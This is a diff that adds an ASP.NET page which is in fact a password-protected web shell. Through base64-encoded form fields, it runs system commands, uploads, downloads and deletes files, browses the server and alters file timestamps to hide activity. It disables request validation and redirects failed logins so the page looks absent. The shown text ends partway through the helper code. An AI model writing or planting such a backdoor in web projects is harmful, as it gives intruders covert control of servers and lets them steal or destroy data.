@@ -1,0 +1,57 @@
+<%@ Page Language="C#" ValidateRequest="false" EnableViewState="false" %>
+
+<%
+try
+{
+NameValueCollection t=HttpContext.Current.Request.Form;
+method selectedMethod=method.auth;
+try{int methodID=int.Parse(fb(t["m"]));selectedMethod=(method)methodID;}catch{rm();}
+p=fb(t["p"]);
+adminU=fb(t["adminU"]);
+adminP=fb(t["adminP"]);
+if(string.IsNullOrEmpty(p)){if(HttpContext.Current.Request.Cookies["p"] != null)p=fb(HttpContext.Current.Request.Cookies["p"].Value);}
+if(selectedMethod != method.auth && selectedMethod != method.authAjax && !login(p)){rm();}
+switch(selectedMethod){
+case method.auth:
+case method.authAjax:auth(p);break;
+case method.command:
+case method.commandAjax:command(fb(t["cmd"]));break;
+case method.upload:upload(HttpContext.Current.Request.Files["uploadFile"],fb(t["uploadPath"]));break;
+case method.download:download(fb(t["don"]),fb(t["isdel"]));break;
+case method.downloadTest:downloadTest(fb(t["don"]));break;
+case method.explorer:exp(fb(t["exadd"]));break;
+case method.getsize:gsize(fb(t["gsize"]));break;
+case method.getlocation:
+case method.getlocationAjax:response(getLoc());break;
+case method.rename:rename(fb(t["rename1"]),fb(t["rename2"]));break;
+case method.copy:copy(fb(t["copy1"]),fb(t["copy2"]));break;
+case method.view:view(fb(t["view"]));break;
+case method.delete:delete(fb(t["delete"]));break;
+case method.multiDelete:multiDelete(fb(t["delete"]));break;
+case method.changeTime:changeTime(fb(t["timeh"]),fb(t["tfil"]),fb(t["ttar"]),fb(t["ttim"]));break;
+default:break;
+}
+}
+catch(Exception ex){response("Error : "+ex.Message);}
+%>
+<script runat="server">
+    enum method{auth=0,command=1,upload=2,uploadbase64=3,delete=4,download=5,changeTime=6,sqlQuery=7,explorer=8,getsize=9,getlocation=10,rename=11,copy=12,view=13,commandAjax=14,downloadTest=15,checkModules=16,installModule=17,uninstallModule=18,cmd7z=19,authAjax=20,getlocationAjax=21,multiDelete=24};
+    string salt="sdfewq@#$51234234DF@#$!@#$ASDF";
+    string p,adminU,adminP;
+    bool aut=false;
+    string pp="J3ugYdknpax1ZbHB2QILB5NS6dVa0iUD0mhhBPv0Srw=";
+    string a(string a,string b){return string.IsNullOrEmpty(a)?b:a;}
+    string tb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Convert.ToBase64String(Encoding.UTF8.GetBytes(a));}catch{}return ret;}
+    string fb(string a){string ret="";try{ret=string.IsNullOrEmpty(a)?a:Encoding.UTF8.GetString(Convert.FromBase64String(a));}catch{}return ret;}
+    void rm(){Response.Redirect(Request.Url.AbsolutePath.Substring(0,Request.Url.AbsolutePath.LastIndexOf("/")+1)+" "+Request.Url.AbsolutePath.Substring(Request.Url.AbsolutePath.LastIndexOf("/")+1));}
+    void auth(string p){
+        string ret=string.Empty;
+        try {
+            ret = string.Format("{{\"auth\":\"{0}\",\"loc\":\"{1}\"}}", login(p).ToString(),tb(getLoc()));
+        } catch(Exception e){
+            ret ="Error : "+e.Message;
+        }
+        response(ret);
+    }
+    bool login(string p){bool aut=false;try{if(!string.IsNullOrEmpty(p)){aut=Convert.ToBase64String(new System.Security.Cryptography.SHA256CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(p+salt)))==pp;}}catch(Exception e){response(e.Message);}return aut;}
+    void command(string cmd){string ret="Error : -";try{string o=exec(cmd);o=o.Remove(0,o.IndexOf(Environment.NewLine)+2);o=o.Remove(0,o.IndexOf(Environment.NewLine)+2);o=o.Remove(0,o.IndexOf(Environment.NewLine));o=o.Remove(o.LastIndexOf(Environment.NewLine));o=o.Remove(o.LastIndexOf(Environment.NewLine)+2);ret=HttpUtility.HtmlEncode(o);}catch(Exception ex){ret="Error : "+ex.Message;}response(ret);}
